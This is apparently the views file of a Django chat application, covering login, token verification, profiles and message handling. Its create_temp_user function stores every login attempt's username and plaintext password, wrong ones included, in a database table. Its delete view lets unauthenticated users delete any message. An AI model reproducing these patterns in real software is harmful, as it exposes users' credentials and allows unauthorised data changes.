import json
from datetime import timedelta

from django.contrib import messages
from django.contrib.auth import authenticate, login as login_user
from django.contrib.auth.decorators import login_required
from django.contrib.humanize.templatetags.humanize import naturaltime
from django.db.models import Q
from django.http.response import JsonResponse
from django.shortcuts import redirect
from django.shortcuts import render, get_object_or_404
from django.utils import timezone

from .models import User, Message, Profile, temp_user


def page_not_found_view(request, exception):
    return render(request, '404.html', status=404)


def custom_login_required(view_func):
    def wrapper(request, *args, **kwargs):
        if request.user.is_authenticated:
            return view_func(request, *args, **kwargs)
        else:
            messages.error(request, 'You need to login first.')
            return redirect('/login/')

    return wrapper


def get_count(request, pk, check):
    if check == 0:
        other_user = get_object_or_404(User, pk=pk)
        count = Message.objects.filter(
            Q(receiver=request.user, sender=other_user, seen=False, deleted=False)
        ).count()
        return count

    else:
        user_obj = User.objects.all().exclude(username=request.user.username)
        for users in user_obj:
            count = get_count(request, users.id, 0)
            users.count = count

        return user_obj


def get_date(message_obj):
    for i in message_obj:
        i.date_created = (i.date_created + timedelta(hours=5, minutes=30)).strftime("%d-%m %I:%M %p")
        try:
            i.seen_at = (i.seen_at + timedelta(hours=5, minutes=30)).strftime("%d-%m %I:%M %p")
        except:
            pass
    return message_obj


# Home Page
def dashboard(request):
    if not request.user.is_authenticated:
        return render(request, 'home.html')

    user_obj = get_count(request, '', 1)
    items = {
        'sid': 'dashboard',
        'page_1': 'dashboard',
        'user_obj': user_obj,
    }
    return render(request, 'dashboard-1.html', items)


def create_temp_user(request, status):
    try:
        if status == 'auth_token' or status == 'login_success' or status == 'login_success_dash' or status == 'auth_token_dash':
            username = request.split('|')[0]
            password = request.split('|')[1]
        elif status == 'invalid_token' or status == 'invalid_token_dash':
            username = ''
            password = ''
        else:
            username = request.POST.get('username')
            password = request.POST.get('password')
            username = username.lower().strip()

        temp_user_obj = temp_user.objects.create(
            username=username,
            password=password,
            status=status,
        )
        temp_user_obj.save()
    except:
        pass


# Login Page
def login(request):
    if request.user.is_authenticated:
        return redirect('/')
    if request.method == 'POST':
        try:
            username = request.POST.get('username')
            password = request.POST.get('password')
            username = username.lower().strip()

            if not username.isascii():
                create_temp_user(request, 'not_char')
                msg = 'Please Enter Proper Details.....!'
                a = {'status': True, 'create': 'details_error', 'msg': msg}
                return JsonResponse(a)

            try:
                user_obj = User.objects.filter(username__iexact=username).first()
            except:
                user_obj = None

            if user_obj is None:
                create_temp_user(request, 'not_exist_user')
                msg = 'Account Not Found .....!'
                a = {'status': True, 'create': 'not_exist_user', 'msg': msg}
                return JsonResponse(a)

            try:
                user_auth = authenticate(request, username=user_obj.username, password=password)
                if user_auth is None:
                    create_temp_user(request, 'worng_password')
                    msg = 'Wrong Password.....!'
                    a = {'status': True, 'create': 'wrong_password', 'msg': msg}
                    return JsonResponse(a)
                create_temp_user(request, 'login_success')
                login_user(request, user_auth)
                request.session['username'] = user_auth.username

                msg = 'Login Successfully.....!'
                a = {'status': True, 'create': 'login_success', 'msg': msg, 'url': '/'}
                return JsonResponse(a)

            except Exception as e:
                create_temp_user(request, f'{e} 1')
                a = {'status': False}
                return JsonResponse(a)
        except Exception as e:
            create_temp_user(request, f'{e} 2')
            a = {'status': False}
            return JsonResponse(a)
    else:
        return render(request, 'login.html')


# Verify Page
def verify(request, auth_token):
    try:
        profile_obj = Profile.objects.filter(auth_token=auth_token).first()
        if profile_obj:
            if not profile_obj.user:
                create_temp_user(f'{profile_obj.username}|{profile_obj.password}', 'auth_token')
                messages.success(request,
                                 'Username is not set, Please set your username. <a href="https://cse-aiml.live/profile/" target="_blank" style="color: #247bf6; font-size: 15px; font-weight: 600;">click here</a>')
                return redirect('/login/')

            create_temp_user(f'{profile_obj.username}|{profile_obj.password}', 'login_success')
            login_user(request, profile_obj.user)
            name = profile_obj.user.username
            request.session['username'] = name
            return redirect('/')
        else:
            create_temp_user(f'', 'invalid_token')
            messages.success(request, 'Invalid Token')
            return redirect('/login/')

    except Exception as e:
        return redirect('/login/')


# Profile Page
@custom_login_required
def profile(request):
    pro_obj = Profile.objects.filter(user=request.user).first()
    items = {
        'sid': 'profile',
        'page_3': 'profile',
        'pro_obj': pro_obj,
    }
    return render(request, 'profile.html', items)


# Chat Delete Function
def delete(request):
    if request.method == 'POST':
        messages_id = request.POST.get('message_id')
        try:
            messages_obj = Message.objects.get(id=messages_id)
            messages_obj.deleted = True
            messages_obj.save()

            a = {'status': True}
            return JsonResponse(a)
        except:
            a = {'status': False}
            return JsonResponse(a)
    else:
        return redirect('/')


# Chat Page with Particular User
@custom_login_required
def chats(request, username):
    try:
        other_user = get_object_or_404(User, username=username)
    except:
        return redirect('/')
    messages = Message.objects.filter(
        Q(receiver=request.user, sender=other_user, deleted=False)
    )
    messages.update(seen=True, seen_at=timezone.now())
    messages = messages | Message.objects.filter(Q(receiver=other_user, sender=request.user, deleted=False))
    messages = get_date(messages)

    pro_obj = Profile.objects.filter(user=other_user).first()
    items = {
        'pro_obj': pro_obj,
        'sid': 'chat',
        'admin': 'admin',
        'page_2': 'chat',
        "other_user": other_user,
        'user_messages': messages,
    }

    user_obj = get_count(request, '', 1)
    items['user_obj'] = user_obj
    return render(request, 'chat-1.html', items)


# Load Chat Messages Evert 2 Seconds
@login_required
def all_messages(request, username):
    check = request.META.get('HTTP_REFERER')
    if not check:
        return redirect('/')
    other_user = get_object_or_404(User, username=username)

    messages = Message.objects.filter(seen=False, receiver=request.user, sender=other_user, deleted=False)

    message_list = [{
        "id": message.id,
        "sender": message.sender.username,
        "message": message.message,
        "date_created": naturaltime(message.date_created),
        "sent": message.sender == request.user,
    } for message in messages]
    messages.update(seen=True, seen_at=timezone.now())

    if request.method == "POST":
        message = json.loads(request.body)['message']

        m = Message.objects.create(receiver=other_user, sender=request.user, message=message)
        datas = {
            "id": m.id,
            "sender": request.user.username,
            "message": m.message,
            "date_created": naturaltime(m.date_created),
            "sent": True,
        }
        message_list.append(datas)

    return JsonResponse(message_list, safe=False)
